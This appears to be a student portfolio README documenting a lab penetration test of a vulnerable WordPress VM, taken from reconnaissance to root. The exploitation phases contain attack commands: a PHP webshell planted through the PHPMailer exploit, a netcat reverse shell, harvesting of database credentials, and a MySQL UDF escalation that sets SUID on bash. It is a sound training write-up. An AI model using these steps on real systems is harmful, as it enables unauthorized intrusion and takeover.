# Operation Iron Raven — Web Application Penetration Test

**A full black-box penetration test of a vulnerable Linux/WordPress target, from host discovery to root-level compromise, performed in an isolated VirtualBox lab environment.**

![Status](https://img.shields.io/badge/status-completed-brightgreen) ![Scope](https://img.shields.io/badge/scope-authorized%20lab%20environment-blue) ![Type](https://img.shields.io/badge/type-black--box%20pentest-orange)

---

## Table of Contents

- [Project Overview](#project-overview)
- [Executive Summary](#executive-summary)
- [Objectives](#objectives)
- [Skills Demonstrated](#skills-demonstrated)
- [Technologies and Tools Used](#technologies-and-tools-used)
- [Lab Environment](#lab-environment)
- [Methodology](#methodology)
- [Evidence and Analysis](#evidence-and-analysis)
  - [Phase 1: Reconnaissance and Host Discovery](#phase-1-reconnaissance-and-host-discovery)
  - [Phase 2: Enumeration](#phase-2-enumeration)
  - [Phase 3: Attempted Attack Vectors (Failed)](#phase-3-attempted-attack-vectors-failed)
  - [Phase 4: Successful Initial Access — CVE-2016-10033](#phase-4-successful-initial-access--cve-2016-10033)
  - [Phase 5: Post-Exploitation](#phase-5-post-exploitation)
  - [Phase 6: Database Enumeration](#phase-6-database-enumeration)
  - [Phase 7: Privilege Escalation — MySQL UDF Exploit](#phase-7-privilege-escalation--mysql-udf-exploit)
  - [Phase 8: Mission Objectives and Proof of Completion](#phase-8-mission-objectives-and-proof-of-completion)
  - [Phase 9: Cleanup and Environment Restoration](#phase-9-cleanup-and-environment-restoration)
- [Findings](#findings)
- [Challenges Encountered](#challenges-encountered)
- [Recommendations](#recommendations)
- [Key Learning Outcomes](#key-learning-outcomes)
- [Professional Value](#professional-value)
- [Repository Structure](#repository-structure)
- [Responsible AI Use Declaration](#responsible-ai-use-declaration)
- [References and Acknowledgements](#references-and-acknowledgements)
- [Disclaimer](#disclaimer)
- [Conclusion](#conclusion)

---

## Project Overview

This repository documents a controlled, authorized penetration test ("Operation Iron Raven") conducted against a purpose-built vulnerable Linux target (Debian GNU/Linux 8, "Raven" VM) running a WordPress installation, as part of an Offensive Security Operations course assessment. The assessment was carried out entirely within an isolated VirtualBox Host-Only network with no exposure to production or external systems.

The engagement followed a full black-box penetration testing lifecycle — reconnaissance, enumeration, vulnerability analysis, exploitation, post-exploitation, privilege escalation, and reporting — and resulted in complete compromise of the target, culminating in root-level access and recovery of all four mission flags.

This project is presented here as a technical portfolio piece to demonstrate practical, hands-on offensive security capability, structured attack methodology, and professional-grade documentation.

---

## Executive Summary

The assessment achieved full compromise of the target system (192.168.56.103) between 10 September 2026 and 16 September 2026. Two critical vulnerabilities were identified and successfully exploited:

1. **PHPMailer 5.2.16/5.2.17 Remote Code Execution (CVE-2016-10033)** — exploited via a WordPress contact form to obtain an initial `www-data` shell.
2. **MySQL Running as Root with a Writable UDF Plugin Directory** — exploited via a compiled MySQL User Defined Function (UDF) shared library to escalate from `www-data` to full `root` access.

Three additional medium/high-severity findings were confirmed: plaintext database credentials in `wp-config.php`, WordPress username enumeration via login error messages, and Apache directory listing exposing sensitive files and mission flags. All four flags were captured, hashed for integrity where applicable, and the environment was restored to its clean baseline snapshot at the conclusion of the engagement.

---

## Objectives

- Perform authorized reconnaissance and enumeration against a designated target inside an isolated lab network.
- Identify exploitable vulnerabilities in web services, third-party libraries, and database configuration.
- Achieve initial access, escalate privileges to root, and document the full attack chain with evidence.
- Recover all mission flags as proof of successful compromise at each stage.
- Produce a professional, evidence-based penetration test report with risk ratings and remediation guidance.
- Restore the lab environment to a clean, verified baseline after all activity concluded.

---

## Skills Demonstrated

- **Network Analysis** — Host discovery, port scanning, and service/version fingerprinting using `nmap`.
- **Vulnerability Assessment** — Mapping identified software versions to known CVEs and locally-mirrored exploit code via `searchsploit`.
- **Web Application Security Testing** — Directory enumeration, CMS fingerprinting, and identification of information-disclosure misconfigurations.
- **Exploitation / Offensive Security** — Weaponizing a public RCE exploit (CVE-2016-10033), troubleshooting failed exploitation attempts, and pivoting between manual and Metasploit-based exploitation paths.
- **Post-Exploitation Tradecraft** — Shell stabilization, filesystem enumeration, and credential harvesting from application configuration files.
- **Database Security Assessment** — Direct MySQL enumeration, privilege verification, and identification of a privilege-escalation-enabling misconfiguration.
- **Privilege Escalation** — Compiling and loading a native shared-library exploit (MySQL UDF) to escalate from a low-privileged web account to root.
- **Log Analysis / Evidence Handling** — Timestamped session logging (`script`), SHA-256 evidence hashing, and structured evidence referencing.
- **Documentation and Reporting** — Producing a structured, risk-rated penetration test report with attack narratives, remediation roadmaps, and an operator activity log.
- **Security Operations Discipline** — Adherence to a strict Rules of Engagement, use of isolated snapshots, and controlled environment restoration.

---

## Technologies and Tools Used

| Tool | Purpose |
|---|---|
| **Nmap 7.99** | Host discovery, port scanning, service/version and OS detection |
| **Gobuster 3.8.2** | Web directory and file enumeration |
| **WPScan 3.8.28** | WordPress user, plugin, theme, and vulnerability enumeration; credential brute-forcing |
| **Searchsploit (Exploit-DB)** | Local exploit database search and exploit mirroring |
| **Metasploit Framework** | Attempted structured exploitation of the PHPMailer vulnerability |
| **Python 3** | Exploit script execution (`40974.py`) and lightweight HTTP file serving |
| **GCC** | Compilation of the MySQL UDF privilege-escalation shared library |
| **MySQL Client** | Direct database interaction and privilege verification |
| **Netcat (nc)** | Reverse shell listener |
| **cURL** | HTTP request crafting, RCE verification, and reverse-shell triggering |
| **iconv** | Wordlist encoding cleanup for brute-force tooling |
| **Firefox** | Manual web application testing and directory-listing review |
| **VirtualBox** | Isolated lab hypervisor and snapshot management |
| **Linux `script` command** | Timestamped session logging for evidentiary purposes |

---

## Lab Environment

| Component | Details |
|---|---|
| **Attacker System** | Kali Linux 2026 — IP: `192.168.56.104` |
| **Target System** | Iron Raven VM (Debian GNU/Linux 8) — IP: `192.168.56.103` |
| **Network** | VirtualBox Host-Only adapter — Subnet `192.168.56.0/24` |
| **Host OS** | Windows 11 |
| **Hypervisor** | Oracle VirtualBox |
| **Assessment Type** | Black-Box Penetration Test |
| **Assessment Period** | 10 September 2026 – 16 September 2026 |

All activity was strictly confined to the isolated Host-Only network with no bridged or internet-facing exposure of the target, in compliance with an Academy-issued Rules of Engagement.

---

## Methodology

The engagement followed a structured, phase-based penetration testing methodology:

1. **Preparation** — Clean baseline snapshots taken; network isolation confirmed; session logging initiated.
2. **Reconnaissance** — Host discovery and port/service enumeration.
3. **Enumeration** — Web directory and WordPress-specific enumeration; software version fingerprinting.
4. **Vulnerability Analysis** — CVE research and exploit identification against fingerprinted software versions.
5. **Exploitation** — Weaponization and execution of a public PHPMailer RCE exploit; reverse shell establishment.
6. **Post-Exploitation** — Credential harvesting, database access, and flag collection.
7. **Privilege Escalation** — Compilation and loading of a MySQL UDF exploit to obtain root.
8. **Cleanup** — Restoration of both attacker and target VMs to their clean baseline snapshots.

All material actions were logged with timestamps using the Linux `script` utility to preserve a verifiable operator activity trail.

---

## Evidence and Analysis

> All screenshots below are presented in exact chronological order as captured during the assessment. Each entry documents the action performed, the evidence observed, its significance to the investigation, and the specific skill it demonstrates.

### Phase 1: Reconnaissance and Host Discovery

**1. Confirming Attacker Network Configuration**

![Attacker IP Configuration](Screenshots/kali_host_only_network_ip.png)

- **Action Performed:** Ran `ip a` on the Kali attacker workstation to confirm its network configuration prior to beginning any offensive activity.
- **Evidence Visible:** The attacker host is confirmed on the isolated Host-Only interface with IP `192.168.56.104`.
- **Why It Matters:** Establishes a verifiable baseline of the attacker's position on the isolated network before any scanning begins — a core requirement of controlled, professional engagements.
- **Skill Demonstrated:** Network configuration verification and engagement preparation discipline.

**2. Host Discovery Scan**

![Nmap Ping Sweep](Screenshots/nmap_ping_scan_result.png)

- **Action Performed:** Executed `sudo nmap -sn 192.168.56.0/24` to sweep the subnet for live hosts.
- **Evidence Visible:** Four live hosts identified on the subnet, including the gateway, the Windows host, the Kali attacker machine, and the target.
- **Why It Matters:** Establishes the full population of reachable systems on the network before narrowing focus to the intended target, reducing the risk of scanning out-of-scope systems.
- **Skill Demonstrated:** Network reconnaissance and host discovery.

**3. Initial Port Scan — False Positive Host**

![Top-20 Scan on .100](Screenshots/false_positive_ip_from_the_ping_scan.png)

- **Action Performed:** Ran a top-20 port and OS scan (`nmap -O -sV --top-ports 20`) against `192.168.56.100`.
- **Evidence Visible:** All scanned ports reported as closed, and OS-guess results returned implausible IoT device signatures.
- **Why It Matters:** Confirmed this host was a false-positive / non-target system, correctly ruling it out before further enumeration effort was spent on it.
- **Skill Demonstrated:** Analytical target validation and avoidance of wasted effort on non-relevant hosts.

**4. Initial Port Scan — Confirmed Target**

![Top-20 Scan on .103](Screenshots/most_likely_scan_result_for_iron_raven.png)

- **Action Performed:** Ran the same top-20 port/OS scan against `192.168.56.103`.
- **Evidence Visible:** Ports 22 (SSH), 80 (HTTP), and 111 (RPCbind) confirmed open, with the host fingerprinted as a Linux system.
- **Why It Matters:** Confirmed this host as the genuine assessment target and identified the initial attack surface (web service).
- **Skill Demonstrated:** Service enumeration and target confirmation.

**5. Full Port, Service, and Script Scan**

![Full Nmap Scan](Screenshots/full_port_script_and_version_scan_on_192_168_56_103.png)

- **Action Performed:** Executed `sudo nmap -p- -sV -sC -oN full_scan.txt 192.168.56.103` for a comprehensive scan of all 65,535 TCP ports with service/version detection and default scripts.
- **Evidence Visible:** OpenSSH 6.7p1 Debian, Apache httpd 2.4.10 with HTTP title "Raven Security," and RPCbind service details, all saved to a timestamped scan file.
- **Why It Matters:** Provided a complete and documented picture of the exposed attack surface, forming the technical basis for all subsequent vulnerability research.
- **Skill Demonstrated:** Comprehensive service enumeration and evidence-based documentation.

---

### Phase 2: Enumeration

**6. Web Directory Enumeration**

![Gobuster Results](Screenshots/gobuster_bruteforce_scan_results.png)

- **Action Performed:** Ran `gobuster` in directory enumeration mode against `http://192.168.56.103/`.
- **Evidence Visible:** Discovery of `/wordpress/`, `/vendor/`, `/contact.php`, and several static resource directories.
- **Why It Matters:** Directly uncovered both the CMS installation and an exposed third-party library directory (`/vendor/`), which later proved to be the initial access vector.
- **Skill Demonstrated:** Web application attack-surface mapping.

**7. New Logging Session and Reachability Recheck**

![Session Restart](Screenshots/Starting_a_new_script_and_reconfirming_the_target_reachability_and_attacker_ip.png)

- **Action Performed:** Started a new timestamped logging session and reconfirmed attacker IP and target reachability via `ip a` and `ping`.
- **Evidence Visible:** Attacker IP unchanged; target responding to ICMP with low latency.
- **Why It Matters:** Confirms environment integrity and log continuity across a multi-day engagement — an important operational and evidentiary practice.
- **Skill Demonstrated:** Engagement discipline and evidence chain-of-custody maintenance.

**8. Initial WPScan Attempt (Failed)**

![WPScan Isolated Network Failure](Screenshots/First_wps_scan_failed_because_of_isolated_network.png)

- **Action Performed:** Attempted to run `wpscan` against the target's WordPress installation.
- **Evidence Visible:** Scan aborted because the database update could not resolve an external hostname, confirming the lab's total network isolation.
- **Why It Matters:** Validated that the isolated Host-Only network had no unintended internet egress, and required a deliberate, documented decision to temporarily enable connectivity for tool updates.
- **Skill Demonstrated:** Environment validation and troubleshooting under realistic tooling constraints.

**9. Tooling and Database Updates**

![WPScan and Searchsploit Update](Screenshots/Updated_the_wps_database_and_did_a_sweep_update_on_other_tools_to_prevent_future_delays.png)

- **Action Performed:** Ran `wpscan --update` and `searchsploit -u` after temporarily enabling internet access.
- **Evidence Visible:** WPScan vulnerability database and Exploit-DB mirror successfully updated.
- **Why It Matters:** Ensured subsequent enumeration and exploit research used current vulnerability data — critical for accurate results.
- **Skill Demonstrated:** Toolchain maintenance and proactive engagement preparation.

**10. Confirming Return to Isolated Network**

![Host-Only Restored](Screenshots/attacker_ip_returned_to_host_only_confirmed__and_no_change_in_host_only_ip_confirmed.png)

- **Action Performed:** Re-ran `ip a` after disabling temporary internet access.
- **Evidence Visible:** Attacker IP confirmed unchanged and restored to the isolated Host-Only configuration.
- **Why It Matters:** Verifies strict compliance with the Rules of Engagement immediately after a temporary, controlled exception.
- **Skill Demonstrated:** Rules-of-engagement compliance verification.

**11. WordPress Enumeration Command**

![WPScan Command](Screenshots/running_wpscan_against_the_victim.png)

- **Action Performed:** Executed `wpscan --url http://192.168.56.103/wordpress/ --enumerate u,vp,vt -o wpscan_output.txt`.
- **Evidence Visible:** Scan launched against the WordPress installation with user, vulnerable-plugin, and vulnerable-theme enumeration flags.
- **Why It Matters:** Targeted, purpose-built enumeration reduces noise and focuses on the most actionable WordPress attack surface.
- **Skill Demonstrated:** CMS-specific enumeration methodology.

**12. WordPress Enumeration Results**

![WPScan Results](Screenshots/wpscan_result.png)

- **Action Performed:** Reviewed the completed WPScan output.
- **Evidence Visible:** WordPress version 4.8.7 confirmed; users `steven` and `michael` identified via author ID brute forcing and confirmed via login error messages.
- **Why It Matters:** Outdated CMS version and disclosed usernames both represent independently confirmed findings and provided targets for later credential-based attacks.
- **Skill Demonstrated:** CMS vulnerability and user enumeration analysis.

**13. Target Identity Confirmation**

![Homepage Confirmation](Screenshots/confirmed_this_is_raven_vm_from_the_content_of_the_html_homepage_on_the_victim_machine.png)

- **Action Performed:** Retrieved the site's homepage HTML content via `curl`.
- **Evidence Visible:** Page content identifying the site as "Raven Security."
- **Why It Matters:** Independently corroborated the target's identity beyond IP address alone, strengthening evidentiary accuracy.
- **Skill Demonstrated:** Manual verification and evidence corroboration.

**14. Directory Listing Discovery**

![Uploads Directory Listing](Screenshots/Accesing_the_wordpress_folder_with_firefox_browser.png)

- **Action Performed:** Browsed to `http://192.168.56.103/wordpress/wp-content/uploads/` in Firefox.
- **Evidence Visible:** Apache directory listing enabled, exposing a `2018/11/` subdirectory.
- **Why It Matters:** Identified an information-disclosure misconfiguration (Apache "Options Indexes") that directly led to the discovery of a mission flag.
- **Skill Demonstrated:** Manual web application misconfiguration testing.

**15. Flag 3 Captured**

![Flag 3](Screenshots/found_flag3.png)

- **Action Performed:** Navigated directly to the discovered `flag3.png` file in the browser.
- **Evidence Visible:** `flag3{a0f568aa9de277887f37730d71520d9b}` displayed in the image.
- **Why It Matters:** Confirmed exploitability of the directory-listing misconfiguration with concrete proof of unauthorized data exposure.
- **Skill Demonstrated:** Evidence capture and objective-based testing.

**16. Flag 3 Preservation and Integrity Hashing**

![Flag 3 Hash](Screenshots/saving_and_hashing_flag3.png)

- **Action Performed:** Downloaded `flag3.png` with `wget` into a dedicated loot folder and generated a SHA-256 hash with `sha256sum`.
- **Evidence Visible:** File saved locally and hash value `2479b9ab0c0763bf9bdc4c2fc36c701001a013a557a5a9f6beda44b024d9cc2e` recorded.
- **Why It Matters:** Demonstrates forensically sound evidence handling — ensuring the captured artifact's integrity can be independently verified.
- **Skill Demonstrated:** Evidence integrity preservation and chain-of-custody practices.

**17. Exploit Research for Fingerprinted Services**

![Searchsploit OpenSSH/Apache](Screenshots/Searchploit_result_for_openssh_6_7_and__apache_2_4_10.png)

- **Action Performed:** Queried `searchsploit` for known exploits against OpenSSH 6.7 and Apache 2.4.10.
- **Evidence Visible:** No directly applicable remote exploits identified for either service at their fingerprinted versions.
- **Why It Matters:** Demonstrates a methodical process of ruling out non-viable attack paths rather than assuming exploitability, redirecting effort toward more promising leads.
- **Skill Demonstrated:** Vulnerability research and analytical prioritization.

---

### Phase 3: Attempted Attack Vectors (Failed)

**18. WordPress Brute Force Attempt #1 — Aborted**

![Brute Force Encoding Error](Screenshots/wpscan_bruteforce_stopped_due_to_invalid_byte_sequence.png)

- **Action Performed:** Launched a WPScan XML-RPC multicall password attack against the identified usernames using the standard `rockyou.txt` wordlist.
- **Evidence Visible:** Attack aborted after approximately 12 minutes due to an invalid UTF-8 byte sequence in the wordlist, with a Ruby stack trace confirming the encoding failure.
- **Why It Matters:** A realistic tooling failure that required diagnosis rather than simple retry — demonstrating troubleshooting under real-world conditions.
- **Skill Demonstrated:** Technical troubleshooting and root-cause analysis.

**19. Wordlist Remediation**

![Cleaned Wordlist](Screenshots/cleaned_rockyou_txt_saved_in_loot_folder.png)

- **Action Performed:** Used `iconv -f utf-8 -t utf-8 -c` to strip invalid byte sequences from `rockyou.txt`, saving the result as `rockyou_clean.txt`.
- **Evidence Visible:** Cleaned wordlist successfully generated in the loot folder.
- **Why It Matters:** Resolved the encoding issue that blocked the previous attack, enabling the brute-force attempt to proceed correctly.
- **Skill Demonstrated:** Practical tooling remediation and preparation for credential attacks.

**20. WordPress Brute Force Attempt #2 — Launched**

![Brute Force Restart](Screenshots/using_the_cleaned_rockyou_txt_wordlist_from_the_loot_folder.png)

- **Action Performed:** Relaunched the WPScan XML-RPC multicall password attack using the cleaned wordlist against usernames `steven` and `michael`.
- **Evidence Visible:** Attack running with a progress bar and ETA against the full wordlist.
- **Why It Matters:** Represents a legitimate, systematic credential-attack attempt as part of a comprehensive assessment, regardless of eventual outcome.
- **Skill Demonstrated:** Credential attack methodology.

**21. WordPress Brute Force Attempt #2 — Completed**

![Brute Force Completed](Screenshots/wordpress_user_login_password_bruteforce_result.png)

- **Action Performed:** Allowed the brute-force attack to run to completion.
- **Evidence Visible:** After 8 hours 8 minutes and 57,377 password attempts, no valid credentials were found.
- **Why It Matters:** A negative result is still a documented, evidence-based finding — confirming that WordPress account passwords were not trivially guessable, and that the eventual compromise path lay elsewhere.
- **Skill Demonstrated:** Persistence, patience, and honest reporting of inconclusive results.

**22. Flag 1 Discovered via Information Disclosure**

![Flag 1](Screenshots/flag1_found.png)

- **Action Performed:** Browsed directly to `http://192.168.56.103/vendor/PATH`, a file discovered during earlier directory enumeration.
- **Evidence Visible:** The file disclosed the absolute server file path `/var/www/html/vendor/` along with `flag1{a2c1f66d2b8051bd3a5874b5b6e43e21}`.
- **Why It Matters:** Provided both a captured mission flag and the server's absolute web root path — later used to correct a failed Metasploit exploitation attempt.
- **Skill Demonstrated:** Information-disclosure exploitation and cross-referencing evidence across attack phases.

**23. Identifying the Vulnerable Library**

![PHPMailer README](Screenshots/Suspecting_Vulnerable_phpmailer_installed.png)

- **Action Performed:** Reviewed `/vendor/README.md`, exposed via the earlier directory listing.
- **Evidence Visible:** Documentation referencing known PHPMailer CVEs, including CVE-2015-8476 and CVE-2008-5619.
- **Why It Matters:** Directed vulnerability research toward version-specific confirmation of the PHPMailer library in use.
- **Skill Demonstrated:** Source documentation analysis for vulnerability triage.

**24. Confirming the Exact Vulnerable Version**

![PHPMailer Version](Screenshots/PHPmailer_version.png)

- **Action Performed:** Browsed to `/vendor/VERSION`.
- **Evidence Visible:** PHPMailer version confirmed as `5.2.16`, below the patched threshold of 5.2.18.
- **Why It Matters:** Definitive version confirmation is essential before selecting and running an exploit, avoiding false positives.
- **Skill Demonstrated:** Precise version fingerprinting and exploit applicability assessment.

**25. Exploit Identification**

![Searchsploit PHPMailer](Screenshots/found_exploit_for_PHPmailer_less_than_5_2_18_that_could_give_me_initial_access.png)

- **Action Performed:** Queried `searchsploit phpmailer`.
- **Evidence Visible:** ExploitDB entry 40974 identified — "PHPMailer < 5.2.18 — Remote Code Execution."
- **Why It Matters:** Matched the confirmed vulnerable version to a specific, usable public exploit.
- **Skill Demonstrated:** Exploit-database research and vulnerability-to-exploit mapping.

**26. Metasploit Exploitation Attempt #1 (Failed)**

![MSF Attempt 1](Screenshots/Exploiting_phpmailer_via_msfconsole_and_write_payload_successful.png)

- **Action Performed:** Attempted exploitation via the Metasploit `multi/http/phpmailer_arg_injection` module against `/contact.php`.
- **Evidence Visible:** Module ran and appeared to write a payload, but the `WEB_ROOT` parameter was incorrectly set to `/var/www` instead of `/var/www/html`.
- **Why It Matters:** A realistic misconfiguration that prevented the payload from being web-accessible — an important lesson in verifying assumptions about server file structure.
- **Skill Demonstrated:** Metasploit module configuration and exploitation troubleshooting.

**27. Reviewing Available Payload Options**

![Available Payloads](Screenshots/available_payloads_for_the_chosen_exploit.png)

- **Action Performed:** Listed available Metasploit payloads compatible with the PHPMailer exploit module.
- **Evidence Visible:** A range of PHP-based command execution and Meterpreter payload options.
- **Why It Matters:** Demonstrates deliberate payload selection rather than default assumption, ensuring the chosen delivery method matched the target environment.
- **Skill Demonstrated:** Metasploit payload evaluation.

**28. Reconfiguring Module Options**

![Corrected Module Options](Screenshots/chosen_exploit_for_phpmailer.png)

- **Action Performed:** Reconfigured `RHOSTS`, `TARGETURI`, `LHOST`, and `LPORT` for a second exploitation attempt.
- **Evidence Visible:** Updated module options reflecting corrected target parameters.
- **Why It Matters:** Shows iterative refinement of an exploitation attempt based on lessons learned from the first failure.
- **Skill Demonstrated:** Methodical exploit configuration and iteration.

**29. Final Options Verification Before Execution**

![Final Options Confirmed](Screenshots/confirming_options_before_run.png)

- **Action Performed:** Reviewed the full set of module and payload options before re-attempting exploitation.
- **Evidence Visible:** `WEB_ROOT` still incorrectly set to `/var/www`, which was later identified as the continuing cause of failure.
- **Why It Matters:** Demonstrates disciplined pre-execution verification, even though the root cause was not caught at this exact step — reinforcing the value of careful configuration review.
- **Skill Demonstrated:** Configuration auditing and attention to detail.

**30. Environment Disruption — VM Crash**

![VirtualBox Crash](Screenshots/iron_raven_crash_report.png)

- **Action Performed:** Continued brute-force operations against the target during the assessment window.
- **Evidence Visible:** The Iron Raven target VM encountered a VirtualBox "Guru Meditation" critical error and halted execution.
- **Why It Matters:** A real infrastructure disruption that required recovery from a snapshot before the assessment could continue — reflecting genuine operational resilience.
- **Skill Demonstrated:** Incident handling and environment recovery under unplanned disruption.

---

### Phase 4: Successful Initial Access — CVE-2016-10033

**31. Payload Delivery Confirmation**

![Webshell Confirmed](Screenshots/phpmailer_successfully_expolited_after_several_attempts.png)

- **Action Performed:** Executed the corrected `40974.py` exploit script against the WordPress contact form and browsed to the resulting payload location.
- **Evidence Visible:** The sendmail transfer log confirmed the argument-injection payload was processed and written to `/var/www/html/payload.php`.
- **Why It Matters:** Confirmed successful exploitation of the sendmail argument-injection vulnerability underlying CVE-2016-10033.
- **Skill Demonstrated:** Exploit execution and payload delivery verification.

**32. Exploit Script Customization**

![Exploit Script Edited](Screenshots/php_mailer_exploit_successful.png)

- **Action Performed:** Reviewed and edited the `40974.py` exploit source, replacing the default "Pwned" message body with a PHP webshell payload (`<?php system($_GET["cmd"]); ?>`).
- **Evidence Visible:** Modified exploit script content and successful console output confirming shell delivery.
- **Why It Matters:** Demonstrates the ability to understand and adapt public exploit code rather than using it as an unmodified black box.
- **Skill Demonstrated:** Exploit code analysis and customization.

**33. Remote Code Execution Verified**

![RCE Verified](Screenshots/shell_successfully_created.png)

- **Action Performed:** Sent `curl "http://192.168.56.103/payload.php?cmd=id"` to the deployed webshell.
- **Evidence Visible:** Response confirmed `uid=33(www-data) gid=33(www-data) groups=33(www-data)`.
- **Why It Matters:** Definitive, unambiguous proof of remote code execution on the target web server.
- **Skill Demonstrated:** RCE validation and command-execution verification.

**34. Interactive Reverse Shell Established**

![Reverse Shell Received](Screenshots/triggered_the_shell_and_got_initial_access_1.png)

- **Action Performed:** Started an `nc -lvnp 4444` listener and triggered a reverse shell via `curl` calling the webshell with a netcat payload.
- **Evidence Visible:** Reverse shell connection received from `192.168.56.103`, providing an interactive `www-data` shell.
- **Why It Matters:** Converted a one-shot command-execution primitive into a persistent, interactive foothold — a critical step for effective post-exploitation.
- **Skill Demonstrated:** Reverse shell establishment and foothold consolidation.

---

### Phase 5: Post-Exploitation

**35. Flag 2 Located**

![Flag 2](Screenshots/Flag2_found.png)

- **Action Performed:** Stabilized the shell with a Python PTY spawn, then searched the filesystem with `find / -name "flag*" 2>/dev/null` and read the result with `cat`.
- **Evidence Visible:** `flag2{6a8ed560f0b5358ecf844108048eb337}` recovered from `/var/www/flag2.txt`.
- **Why It Matters:** Confirmed further progress toward full mission completion using systematic filesystem enumeration.
- **Skill Demonstrated:** Post-exploitation filesystem enumeration.

**36. Database Credentials Recovered**

![WP-Config Credentials](Screenshots/found_the_credentials_for_mysql_login.png)

- **Action Performed:** Read the WordPress configuration file with `cat /var/www/html/wordpress/wp-config.php | grep DB_`.
- **Evidence Visible:** Plaintext MySQL root credentials (`DB_USER=root`, `DB_PASSWORD=R@v3nSecurity`) disclosed in the configuration file.
- **Why It Matters:** A single file read exposed full database administrator credentials — the direct prerequisite for the subsequent privilege escalation.
- **Skill Demonstrated:** Configuration file analysis and credential harvesting.

---

### Phase 6: Database Enumeration

**37. MySQL Access Established**

![MySQL Login](Screenshots/Got_access_to_the_mysql_database.png)

- **Action Performed:** Connected to the local MySQL service using the recovered root credentials (`mysql -u root -p'R@v3nSecurity'`).
- **Evidence Visible:** Successful authentication to the MySQL monitor, version 5.5.60-0+deb8u1.
- **Why It Matters:** Confirmed credential validity and provided full database access for further enumeration.
- **Skill Demonstrated:** Database access verification.

**38. WordPress User Hashes Extracted**

![Password Hashes](Screenshots/got_the_password_hash_for_both_worpress_users.png)

- **Action Performed:** Queried `SELECT * FROM wp_users;` against the WordPress database.
- **Evidence Visible:** Password hashes and account details for users `michael` and `steven` returned in full.
- **Why It Matters:** Demonstrates the depth of access achievable once database credentials are compromised, corroborating the earlier username enumeration finding.
- **Skill Demonstrated:** Database enumeration and data-exposure analysis.

**39. Root-Level MySQL Privileges Confirmed**

![MySQL Running as Root](Screenshots/priv_escal_confirmed_as_mysql_is_running_as_root.png)

- **Action Performed:** Ran `SELECT user();` within the MySQL session.
- **Evidence Visible:** Query returned `root@localhost`.
- **Why It Matters:** Confirmed that the MySQL service itself was running as the operating system's root user — a critical misconfiguration enabling privilege escalation.
- **Skill Demonstrated:** Privilege-level verification and misconfiguration identification.

**40. MySQL Version and Exploit Research**

![MySQL Version and Searchsploit](Screenshots/mysql_version_on_the_victim.png)

- **Action Performed:** Ran `SELECT version();` and cross-referenced the result with `searchsploit`.
- **Evidence Visible:** MySQL confirmed as version 5.5.60-0+deb8u1, with matching User-Defined-Function (UDF) exploits identified in Exploit-DB.
- **Why It Matters:** Connected the confirmed root-privileged MySQL service to a specific, applicable class of privilege-escalation exploit.
- **Skill Demonstrated:** Version-based exploit research for privilege escalation.

**41. Plugin Directory Confirmed Writable Target**

![Plugin Directory](Screenshots/mysql_version_and_plugin_location_on_the_victim.png)

- **Action Performed:** Queried `SELECT @@plugin_dir;`.
- **Evidence Visible:** Plugin directory confirmed at `/usr/lib/mysql/plugin/`.
- **Why It Matters:** Identified the exact filesystem location required to load a malicious UDF shared library.
- **Skill Demonstrated:** Environment reconnaissance in support of exploit planning.

---

### Phase 7: Privilege Escalation — MySQL UDF Exploit

**42. Exploit Transfer to Victim**

![Exploit Transfer](Screenshots/imported_exploit_to_victim.png)

- **Action Performed:** Mirrored ExploitDB 1518 on Kali with `searchsploit -m 1518`, served it via `python3 -m http.server 8080`, and downloaded it to the victim's `/tmp` directory with `wget`.
- **Evidence Visible:** `1518.c` successfully transferred to the target filesystem.
- **Why It Matters:** Established the exploit source code on the target, a necessary precursor to local compilation.
- **Skill Demonstrated:** Cross-host file transfer and exploit staging.

**43. Initial Compilation Failure**

![Compilation Failure](Screenshots/failed_attempt_at_compiling_the_code_on_the_victim__turns_out_it_needs_the_flag_-FPIC.png)

- **Action Performed:** Attempted to compile `1518.c` into a shared object without the `-fPIC` flag.
- **Evidence Visible:** Compilation failed with a `relocation R_X86_64_PC32` error related to position-independent code requirements.
- **Why It Matters:** A genuine technical obstacle correctly diagnosed as a compiler-flag issue specific to 64-bit shared object linking.
- **Skill Demonstrated:** C compilation troubleshooting and Linux shared-library build knowledge.

**44. Successful Compilation**

![Compilation Success](Screenshots/code_successfully_compiled_on_victim.png)

- **Action Performed:** Recompiled with the `-fPIC` flag (`gcc -g -fPIC -c 1518.c -o 1518.o`, then linked into `1518.so`).
- **Evidence Visible:** `1518.so` successfully generated (8,136 bytes).
- **Why It Matters:** Resolved the compilation blocker, producing a usable UDF shared library ready for loading into MySQL.
- **Skill Demonstrated:** Applied systems programming and exploit compilation.

**45. Root Access Achieved**

![Root Access](Screenshots/Got_root_after_loading_the_exploit_into_the_database.png)

- **Action Performed:** Loaded `1518.so` into the MySQL plugin directory via a BLOB table and `dumpfile`, registered it as the `do_system()` UDF, and executed `SELECT do_system('chmod u+s /bin/bash');`, followed by `/bin/bash -p`.
- **Evidence Visible:** `/bin/bash` confirmed with the SUID bit set (`-rwsr-xr-x`); `whoami` returned `root`.
- **Why It Matters:** Definitive proof of full privilege escalation from an unprivileged web account to complete root-level system compromise.
- **Skill Demonstrated:** Advanced privilege escalation via native code execution and database-to-OS pivoting.

---

### Phase 8: Mission Objectives and Proof of Completion

**46. Root-Level Flag Search**

![Flag Search as Root](Screenshots/found_flag4.png)

- **Action Performed:** Ran `find / -name "flag*" 2>/dev/null` with root privileges.
- **Evidence Visible:** `/root/flag4.txt` located among the filesystem results.
- **Why It Matters:** Confirmed access to a location only reachable with root privileges, validating the success of the privilege escalation.
- **Skill Demonstrated:** Post-privilege-escalation objective verification.

**47. Flag 4 Captured — Full Compromise Confirmed**

![Flag 4](Screenshots/flag4.png)

- **Action Performed:** Read the final flag file with `cat /root/flag4.txt`.
- **Evidence Visible:** `flag4{df2bc5e951d91581467bb9a2a8ff4425}` displayed, alongside a congratulatory message confirming full root compromise of the target.
- **Why It Matters:** Final, conclusive proof that the entire attack chain — from reconnaissance to root — was completed successfully.
- **Skill Demonstrated:** Objective completion and end-to-end attack chain validation.

---

### Phase 9: Cleanup and Environment Restoration

**48. Attacker Machine Restored**

![Kali Snapshot Restore](Screenshots/Restoring_kali_snapshot_to_clean_baseline.png)

- **Action Performed:** Restored the Kali attacker VM to its `CIP-A105-CTF1-CLEAN-BASELINE` snapshot in VirtualBox.
- **Evidence Visible:** Snapshot restoration confirmation dialog for the attacker VM.
- **Why It Matters:** Ensures the attacker environment is returned to a known-clean state, preventing residual tooling or artifacts from carrying over to future engagements.
- **Skill Demonstrated:** Environment hygiene and engagement closeout discipline.

**49. Target Machine Restored**

![Raven Snapshot Restore](Screenshots/Restoring_raven_snapshot_to_clean_baseline.png)

